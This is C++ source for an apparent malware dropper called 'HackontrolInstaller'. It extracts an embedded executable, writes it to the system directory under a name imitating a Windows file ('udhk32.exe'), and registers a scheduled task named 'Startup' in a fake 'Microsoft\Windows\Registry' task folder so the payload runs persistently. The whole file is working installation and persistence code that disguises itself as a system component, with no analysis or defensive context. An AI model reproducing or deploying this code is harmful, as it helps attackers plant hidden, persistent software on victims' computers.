#include <stdio.h>
#include "HackontrolInstaller.h"
#include "resource.h"

#define FILE_NAME L"udhk32.exe"

int main(int argc, char** argv) {
	printf("Getting System Directory\n");
	wchar_t* filePath = HI_GetSystemDirectory(FILE_NAME);
	printf("Getting Executable Resource\n");
	HRSRC resourceHandle = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

	if(resourceHandle == NULL) {
		HI_FormatError(GetLastError(), "FindResourceW()");
		return -1;
	}

	printf("Getting Resource Size\n");
	DWORD size = SizeofResource(NULL, resourceHandle);

	if(size == NULL) {
		HI_FormatError(GetLastError(), "SizeofResource()");
		return -1;
	}

	printf("Resource Size: %d Bytes\n", size);
	printf("Loading Resource\n");
	HGLOBAL resource = LoadResource(NULL, resourceHandle);

	if(resource == NULL) {
		HI_FormatError(GetLastError(), "LoadResource()");
		return -1;
	}

	printf("Locking Resource\n");
	BYTE* data = static_cast<BYTE*>(LockResource(resource));

	if(data == NULL) {
		HI_FormatError(GetLastError(), "LockResource()");
		return -1;
	}

	printf("Creating/Opening File\n");
	HANDLE file = CreateFileW(filePath, GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if(file == INVALID_HANDLE_VALUE) {
		HI_FormatError(GetLastError(), "CreateFileW()");
		return -1;
	}

	DWORD written = 0;
	printf("Writing File\n");

	if(WriteFile(file, data, size, &written, NULL) == NULL) {
		HI_FormatError(GetLastError(), "WriteFile()");
		return -1;
	}

	printf("Total Size: %d Bytes\nBytes Written: %d Bytes\n", size, written);
	printf("Closing File\n");

	if(CloseHandle(file) == NULL) {
		HI_FormatError(GetLastError(), "CloseHandle()");
		return -1;
	}

	HI_InitializeComAPI();
	ITaskService* service = HI_CreateTaskService();
	ITaskFolder* folder = HI_CreateFolder(service, L"Microsoft\\Windows\\Registry");
	ITaskDefinition* definition = HI_NewTask(service, folder);
	HI_SetPrincipal(folder, definition);
	HI_SetTriggers(folder, definition);
	HI_SetActions(folder, definition, filePath);
	HI_SetSettings(folder, definition);
	HI_RegisterTask(folder, definition, L"Startup");
	definition->Release();
	folder->Release();
	CoUninitialize();
	return 0;
}
